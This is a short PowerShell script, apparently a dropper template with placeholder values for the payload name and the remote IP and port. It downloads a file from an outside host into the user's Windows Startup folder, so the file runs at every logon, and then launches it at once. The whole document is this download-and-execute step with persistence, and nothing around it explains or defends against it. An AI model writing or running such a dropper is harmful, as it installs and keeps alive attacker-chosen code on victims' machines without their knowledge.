$payload = 'PAYLOAD'

Invoke-WebRequest -Uri "http://IP:PORT/$payload" `
	-OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"

Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"